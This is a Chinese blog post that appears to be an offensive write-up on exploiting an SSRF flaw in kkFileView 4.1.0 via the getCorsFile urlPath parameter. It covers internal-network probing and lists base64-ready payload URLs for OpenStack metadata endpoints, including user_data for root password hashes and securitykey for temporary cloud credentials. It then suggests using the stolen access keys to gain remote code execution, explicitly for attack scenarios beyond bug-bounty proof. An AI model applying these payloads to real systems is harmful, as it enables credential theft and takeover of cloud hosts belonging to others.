---
title: "kkfileview的SSRF的利用思路"
date: 2026-11-19 00:00:00
---

# kkfileview的SSRF的利用思路

**漏洞描述**

kkFileview v4.1.0存在SSRF漏洞，攻击者可以利用此漏洞造成服务器端请求伪造（SSRF），远程攻击者可以通过将任意url注入url参数来强制应用程序发出任意请求。

**漏洞影响**

kkFileview =v4.1.0



这个产品中的路径getCorsFile?urlPath=<base64编码>存在SSRF漏洞

一般进行dnslog探测

去ping我们的dnslog，但是有时它禁止去ping这些

我们可以去尝试探测内网的地址，如172开头或者127开头



有时我们可以尝试去ping云上的地址，尝试让SSRF的危害扩大到云上用户接管



## 案例

先探测尝试证明这里存在SSRF，这时我们尝试去访问云上数据



第一步：**列元数据目录**

Payload:

```
http://ip/openstack/latest/
```

对上面的内容进行base64编码

放到urlPath路径后面

![caeae289b7172639139c9de90adbf734](/img/misc/caeae289b7172639139c9de90adbf734.png)

一般情况到这里就已经证明成功了，在SRC中只要这样就可以了



但是我们说主要谈论的是攻防的情况下，我们要怎么接着利用

接下来就是去访问

读云元数据 meta_data.json

```
http://ip/openstack/meta_data.json
```

读 user_data —— root 密码 hash

```
http://ip/openstack/latest/user_data
```

读 securitykey —— 云临时凭据

```
http://ip/openstack/latest/securitykey
```

接着去读取aksk，连aksk，去rce
